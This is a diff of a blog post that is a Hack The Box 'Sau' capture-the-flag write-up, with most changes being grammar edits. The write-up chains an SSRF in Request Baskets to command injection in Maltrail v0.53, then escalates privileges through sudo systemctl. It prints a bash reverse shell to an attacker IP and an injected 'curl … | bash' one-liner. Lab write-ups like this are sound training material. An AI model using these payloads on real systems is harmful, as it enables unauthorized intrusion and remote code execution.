@@ -6,22 +6,23 @@ pubDate: 2020-03-02T00:00:00Z
 // imgSrc: '/assets/images/image-post5.jpeg'
 imgSrc: 'https://labs.hackthebox.com/storage/avatars/1ea2980b9dc2d11cf6a3f82f10ba8702.png'
 imgAlt: 'Image post 5'
+tags: ['htb', 'linux', 'easy', 'ssrf', 'rce']
 ---
 
 
 # Hack The Box - Sau Writeup
 ### by Roqeeb  
 # Introduction
-Hello welcome to my first-ever published writeup,Today we'll be rooting an easy rated box from hackthebox, i was able to learn new things from this box and i found it interesting, i hope you enjoy it too.  
+Hello, welcome to my first-ever published writeup. Today we'll be rooting an easy-rated box from HackTheBox. I was able to learn new things from this box and found it interesting — I hope you enjoy it too.  
 Let's go
 # Information Gathering
 ## Nmap
-i used nmap to scan the ip address with this command
+I used Nmap to scan the IP address with this command:
 ```
 nmap -sC -sV 10.10.11.224 -p- -vvv -T3 -oN nmap
 ```
 
-From our scan there are two open ports opened ports 22 and 55555 ,due the speed of my scan i also got some false positives port 80 and 6003 with the ‘filtered’ state, i will be ignoring because accessing them provides no response.
+From our scan there are two open ports: 22 and 55555. Due to the speed of my scan, I also got some false positives — ports 80 and 6003 in a `filtered` state — but I’ll be ignoring those since accessing them provides no response.
 
 
 
@@ -72,17 +73,16 @@ PORT      STATE    SERVICE REASON      VERSION
 |     Date: Tue, 25 Jul 2023 05:29:07 GMT
 |_    Content-Length: 0
 ```
-I will start enumeration from port 55555, from our scan we can see there's a webserver running on that port  
-i opened it in my web browser and there's a webapp called request baskets, on the bottom left there's a version number
+I'll start enumeration from port 55555 — from our scan we can see there's a web server running on that port. I opened it in my browser and found a webapp called Request Baskets, with a version number visible in the bottom left.
 ![homepage](https://github.com/0xRoqeeb/writeups/assets/49154037/0be33d47-172b-4250-90f2-3ae4d4bd558d)
 
 
-i started poking around the site to find out how it works, it's an application that allows you to create a basket which gives you a url and any request made to that url will be collected in your basket hence the name requests basket  
+I started poking around the site to find out how it works. It's an application that allows you to create a basket, which gives you a URL — any request made to that URL gets collected in your basket, hence the name Request Baskets.
 
 ![newbasket](https://github.com/0xRoqeeb/writeups/assets/49154037/e954d827-d88d-44f7-80a1-6e64e18f2e59)
 
 
-i tested GET and POST requests on the url using curl i didnt get a response in my terminal but the requests were collected in the request basket
+I tested GET and POST requests on the URL using curl. I didn't get a response in my terminal, but the requests were collected in the basket:
 
 ```console
 ┌──(mofe㉿mofe)-[~]
@@ -95,8 +95,7 @@ i tested GET and POST requests on the url using curl i didnt get a response in m
 
 # Vulnerability Assessment
 
-Next I created a new basket and intercepted the request with burpsuite ,it didn't reveal much.  
-After that i looked up the version number of requests basket online to check if this current version was vulnerable and i found out that it was susceptible to SSRF, it also has a POC [CVE-2023-27163]( https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3)
+Next, I created a new basket and intercepted the request with Burp Suite — it didn't reveal much. After that, I looked up the version number of Request Baskets online and found out it was susceptible to SSRF, it also has a POC [CVE-2023-27163]( https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3)
 
 ```console
 POST /api/baskets/{name} API with payload - {"forward_url": "http://127.0.0.1:80/test","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}
@@ -105,17 +104,17 @@ POST /api/baskets/{name} API with payload - {"forward_url": "http://127.0.0.1:80
 It turns out that the */api/baskets/name* and */baskets/name* are the  API endpoints vulnerable to unauthenticated SSRF.
 Requests sent to */baskets/name* url will be reflected on the url in the **forward_url** parameter  
 
-you can do this with a curl command
+You can do this with a curl command:
 
 ```console
 curl --location 'http://10.10.11.224:55555/api/baskets/{name}' --data '{"forward_url": "http://127.0.0.1:80/","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}'
 ```
 
-but i'll be doing it directly from the web application, to do that we navigate to our baskets page and click on the settings icon top right
+But I'll be doing it directly from the web application. Navigate to your baskets page and click on the settings icon in the top right.
 ![2023-07-25_08-51](https://github.com/0xRoqeeb/writeups/assets/49154037/f017b677-84d7-49a5-ab37-1bfb6e5edd26)
 
 
-on the configuration page we set the fields as follows:-    
+On the configuration page, set the fields as follows:
 ***Forward URL***:*http://127.0.0.1:80/* (to reveal any internal websites, this field will forward our requests from the basket url to the hidden webpage)  
 
 ***Proxy Response*** : *true* ( i set this field to false as the POC stated but i didn't get a response, it only made sense to set it to true)  
@@ -123,36 +122,36 @@ on the configuration page we set the fields as follows:-
 ![2023-07-25_07-55](https://github.com/0xRoqeeb/writeups/assets/49154037/7c68fe7a-8e65-4be6-8000-a3718e657963)
 
 
-after that click apply to save changes
+After that, click **Apply** to save changes.
 
-now we access our basket through the url again and this time we're seeing something different, we come across a CSS starved website ,looking at the bottom left i found out this website was *Powered by Maltrail (v0.53)*
+Now we access our basket through the URL again — this time we're seeing something different. We come across a CSS-starved website. Looking at the bottom left, I found out this website was *Powered by Maltrail (v0.53)*.
  ![2023-07-25_13-03_1](https://github.com/0xRoqeeb/writeups/assets/49154037/d90ba8b4-3bb1-422c-858f-cf2de0f3fa7f)
 
 
-A bit of googling and i found out this version was vulnerable to Unauthenticated OS Command Injection, the username parameter in the */login* page contained the command injection vulnerability  
+A bit of Googling and I found out this version was vulnerable to Unauthenticated OS Command Injection, the username parameter in the */login* page contained the command injection vulnerability  
 [POC](https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/) 
 ```console
 curl 'http://hostname:8338/login' --data 'username=;`id > /tmp/bbq`'
 ```
-since we'll be testing the */login* page let's update our *forward_url* parameter  
+Since we'll be testing the `/login` page, let's update our `forward_url` parameter:
 
 Using a curl command
 ```console
 curl --location 'http://10.10.11.224:55555/api/baskets/{name}' --data '{"forward_url": "http://127.0.0.1:80/login","proxy_response": True,"insecure_tls": false,"expand_path": true,"capacity": 250}'
 ```
- or we can edit our existing basket from the basket configuration page
+Or we can edit our existing basket from the basket configuration page:
 
 ![damn](https://github.com/0xRoqeeb/writeups/assets/49154037/cf15037c-c400-4c14-8985-23dab848265c)
 
-trying to access the login page from the browser gives us this response, so we'll have to use curl from here
+Trying to access the login page from the browser gives us this response, so we'll have to use curl:
 ![2023-07-25_08-14](https://github.com/0xRoqeeb/writeups/assets/49154037/467fed24-5dab-4eea-ba89-d16fe65f6443)
 
 
 # Exploitation
-Getting a reverse shell
 
-I created a shell.sh file with my payload in it and setup a python webserver to host it on port 80 preferably
-make sure the payload file is in the same folder you set up the webserver
+## Getting a Reverse Shell
+
+I created a `shell.sh` file with my payload and set up a Python web server to host it on port 80. Make sure the payload file is in the same folder as your web server.
 ```console
 ┌──(mofe㉿mofe)-[~/tools]
 └─$ cat shell.sh               
@@ -163,11 +162,11 @@ bash -i >& /dev/tcp/10.10.14.135/4444 0>&1
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 ```
-so we run our one liner
+Run the following one-liner:
 ```console
  curl "http://10.10.11.224:55555/fourth" --data 'username=;` curl 10.10.14.135/shell.sh | bash` '
 ```
-and immediately we get a shell, first things first we upgrade our shell
+We immediately get a shell. First things first — upgrade it:
 - python3 -c 'import pty; pty.spawn("/bin/bash")'
 - Ctrl^Z to background the shell
 - stty raw -echo ; fg to foreground the shell
@@ -197,12 +196,12 @@ puma@sau:/opt/maltrail$
 ```
 now we have an interactive shell.
 # Privilege Escalation
-Once we get initial access the road to root on sau is a piece of cake
+Once we get initial access, the road to root on Sau is a piece of cake.
 
-running the command sudo -l to see the commands our current user can run
+Run `sudo -l` to see what our current user can run:
  ![2023-07-25_08-19](https://github.com/0xRoqeeb/writeups/assets/49154037/42af050d-2232-49e5-ae63-477b543f9966)
 
-we can run */usr/bin/systemctl status trail.service* as root and **NOPASSWD** means we can invoke the sudo command without a password  
+We can run `/usr/bin/systemctl status trail.service` as root, and **NOPASSWD** means we can invoke `sudo` without a password.
 I checked gtfobins for the binary we have access to and luckily there's an entry for [systemctl](https://gtfobins.github.io/gtfobins/systemctl/)  
 
  ![2023-07-25_08-25_1](https://github.com/0xRoqeeb/writeups/assets/49154037/e15e2ac0-857f-4213-8296-6c3bed8c0223)
